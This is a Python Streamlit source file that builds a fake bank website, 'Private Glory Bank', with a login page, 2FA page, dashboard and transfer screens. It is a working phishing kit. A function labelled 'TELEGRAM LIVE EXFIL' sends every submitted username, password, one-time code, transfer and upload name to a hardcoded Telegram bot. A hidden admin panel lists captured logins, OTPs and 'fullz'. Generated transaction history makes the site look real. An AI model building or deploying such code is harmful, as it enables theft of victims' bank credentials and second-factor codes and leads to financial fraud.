import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import requests
import random

# ==================== TELEGRAM LIVE EXFIL ====================
def tg(message):
    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
    CHAT_ID = "141975691"
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                     data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

# ==================== STATE & HYPER-REALISTIC HISTORY ====================
state = st.session_state
state.checking = state.get("checking", 12340.50)
state.savings  = state.get("savings", 14911.32)
state.captured = state.get("captured", [])
state.otp_log  = state.get("otp_log", [])
state.files    = state.get("files", [])
state.auth     = state.get("auth", False)
state.otp_ok   = state.get("otp_ok", False)
state.admin    = state.get("admin", False)
if "users" not in state: state.users = {}

if "tx" not in state:
    merchants = {
        "Groceries": ["Whole Foods Market", "Trader Joe's", "Kroger", "Publix"],
        "Dining": ["Starbucks", "Chick-fil-A", "Chipotle", "Panera Bread"],
        "Gas": ["Shell", "Exxon", "Chevron", "Costco Gas"],
        "Shopping": ["Amazon.com", "Target", "Walmart", "Best Buy"],
        "Subscriptions": ["Netflix", "Spotify", "Apple Services", "Hulu"],
        "Utilities": ["Comcast Xfinity", "Verizon Wireless", "AT&T"],
        "Income": ["Direct Deposit - ACME CORP"]
    }
    txs = []
    start = datetime.now() - timedelta(days=90)
    for day in range(90):
        date = start + timedelta(days=day)
        num = random.choices([0,1,2,3], [5,40,40,15])[0]
        for _ in range(num):
            cat = random.choices(list(merchants.keys()), [16,14,10,20,12,10,18])[0]
            merchant = random.choice(merchants[cat])
            amount = round(random.uniform(9.99, 599.99), 2)
            if cat == "Subscriptions" and date.day in [1,2]: amount = {"Netflix":15.99}.get(merchant.split()[0], amount)
            acct = "Checking" if cat == "Income" else random.choice(["Checking","Savings"])
            txs.append({"date":date.strftime("%m/%d"),"desc":merchant,"amount":amount if cat=="Income" else -amount,"account":acct})
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ==================== GOLDEN EAGLE + RESPONSIVE UI ====================
EAGLE = "https://i.imgur.com/8mQ8Z8K.png"  # 100% LIVE

st.markdown(f"""
<style>
    .stApp {{background: #f8f9fc; margin:0; padding:0;}}
    .header {{background: linear-gradient(135deg, #0e2a47, #1e4d72); padding: 3rem 1rem; text-align: center; border-bottom: 6px solid #c9a227;}}
    .header img {{width: 180px; max-width: 90vw;}}
    .bank-title {{color: white; font-size: 2.8rem; font-weight: 300; margin: 12px 0 0;}}
    .bank-subtitle {{color: #e8c66a; font-size: 1.1rem; margin: 8px 0 0;}}

    .login-card {{background: white; padding: 2.8rem 2.2rem; border-radius: 28px; box-shadow: 0 20px 60px rgba(0,0,0,0.15); max-width: 500px; width: 100%; margin: 2rem auto;}}
    @media (max-width: 600px) {{.login-card {{padding: 2rem 1.5rem; margin: 1rem;}} .bank-title {{font-size: 2.2rem;}}}}

    .stTextInput > div > div > input {{border-radius: 16px !important; border: 2px solid #ddd !important; padding: 16px !important;}}
    .stButton > button {{background: linear-gradient(135deg, #c9a227, #e8c66a); color: #0e2a47; border: none; border-radius: 16px; height: 4rem; font-weight: 600; width: 100%;}}
    .stButton > button:hover {{background: #0e2a47; color: white;}}
</style>
""", unsafe_allow_html=True)

def header():
    st.markdown(f'''
    <div class="header">
        <img src="{EAGLE}" alt="Private Glory Bank">
        <h1 class="bank-title">PRIVATE GLORY BANK</h1>
        <p class="bank-subtitle">Secure • Modern • American Banking</p>
    </div>
    ''', unsafe_allow_html=True)

# ==================== LOGIN ====================
def login():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 1.1, 1])
    with col2:
        st.markdown("<div class='login-card'>", unsafe_allow_html=True)
        st.markdown("<h2 style='text-align:center;color:#0e2a47;margin-bottom:8px;'>Welcome Back</h2>")
        st.markdown("<p style='text-align:center;color:#666;margin-bottom:32px;'>Sign in to your private banking account</p>")

        with st.form("login_form"):
            username = st.text_input("Username", placeholder="Enter your username")
            password = st.text_input("Password", type="password", placeholder="Enter your password")
            st.markdown("<small style='color:#0e2a47'>Forgot password?</small>", unsafe_allow_html=True)
            st.checkbox("Remember me", value=True)
            submitted = st.form_submit_button("Sign In Securely", use_container_width=True)
            if submitted:
                tg(f"LOGIN\nUser: {username}\nPass: {password}\nTime: {datetime.now()}")
                if username == "Awesome12@" and password == "SecureUSA2025!":
                    state.auth = True
                    tg("VALID CREDENTIALS — FULL ACCESS")
                    st.rerun()
                elif username == "admin" and password == "showme2025":
                    state.admin = True
                    st.rerun()
                else:
                    st.error("Invalid username or password")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP ====================
def otp():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center;color:#0e2a47'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
    code = st.text_input("Verification Code", max_chars=6, placeholder="000000")
    if st.button("Verify Code", type="primary", use_container_width=True):
        tg(f"OTP: {code}")
        if len(code) == 6 and code.isdigit():
            state.otp_ok = True
            tg("OTP ACCEPTED")
            st.success("Success")
            st.rerun()

# ==================== DASHBOARD ====================
def dashboard():
    header()
    st.markdown(f"<p style='text-align:right;color:#666;padding:0 1rem;'>Welcome back • {datetime.now().strftime('%B %d')}</p>", unsafe_allow_html=True)

    c1,c2,c3,c4 = st.columns([1,1,1,1])
    with c1: st.markdown(f"<div class='card'><p style='color:#666;font-size:1rem;'>Checking ••••1776</p><p style='font-size:2.4rem;color:#0e2a47;font-weight:600;'>${state.checking:,.2f}</p></div>", unsafe_allow_html=True)
    with c2: st.markdown(f"<div class='card'><p style='color:#666;font-size:1rem;'>Savings ••••1812</p><p style='font-size:2.4rem;color:#0e2a47;font-weight:600;'>${state.savings:,.2f}</p></div>", unsafe_allow_html=True)
    with c3: st.markdown(f"<div class='card'><p style='color:#666;font-size:1rem;'>Total Balance</p><p style='font-size:2.4rem;color:#0e2a47;font-weight:600;'>${state.checking + state.savings:,.2f}</p></div>", unsafe_allow_html=True)
    with c4: st.markdown(f"<div class='card'><p style='color:#666;font-size:1rem;'>Available Credit</p><p style='font-size:2.4rem;color:#0e2a47;font-weight:600;'>$18,500</p></div>", unsafe_allow_html=True)

    view = st.radio("View Transactions", ["All Accounts", "Checking Only", "Savings Only"], horizontal=True)
    filtered = state.tx
    if view == "Checking Only": filtered = [t for t in state.tx if t["account"] == "Checking"]
    if view == "Savings Only": filtered = [t for t in state.tx if t["account"] == "Savings"]

    st.markdown("<br><h3 style='color:#0e2a47;padding:0 1rem;'>Recent Activity</h3>", unsafe_allow_html=True)
    df = pd.DataFrame(filtered[:15])
    display = df[["date", "desc", "amount"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)

# ==================== TRANSFER ====================
def transfer():
    header()
    tab1, tab2 = st.tabs(["Internal Transfer", "Pay with Card"])
    with tab1:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
        amount = st.number_input("Amount ($)", min_value=0.01)
        if st.button("Transfer Now", type="primary"):
            if "Checking" in from_acc and amount > state.checking:
                st.error("Insufficient funds")
            elif "Savings" in from_acc and amount > state.savings:
                st.error("Insufficient funds")
            else:
                if "Checking" in from_acc:
                    state.checking -= amount
                    state.savings += amount
                else:
                    state.savings -= amount
                    state.checking += amount
                tg(f"TRANSFER\n${amount:,.2f}")
                st.success("Transfer Complete")
                st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== MESSAGES ====================
def messages():
    header()
    st.markdown("<div class='card'>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload Documents")
    if uploaded:
        tg(f"FILE UPLOADED\n{uploaded.name}")
        st.success("Received")
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== ADMIN ====================
def admin():
    header()
    st.markdown("<h1 style='color:#0e2a47;text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]: st.json([x for x in state.captured if "fullz" in str(x)])
    with tabs[3]: st.write(state.files)
    with tabs[4]: st.dataframe(pd.DataFrame(state.tx[:100]))

# ==================== SIDEBAR ====================
def sidebar():
    st.sidebar.markdown(f'<img src="{EAGLE}" width="100">', unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Messages", "Logout"])

# ==================== MAIN FLOW ====================
if not state.auth and not state.admin:
    login()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Transfer": transfer()
    elif page == "Messages": messages()
    elif page == "Logout":
        st.session_state.clear()
        st.rerun()
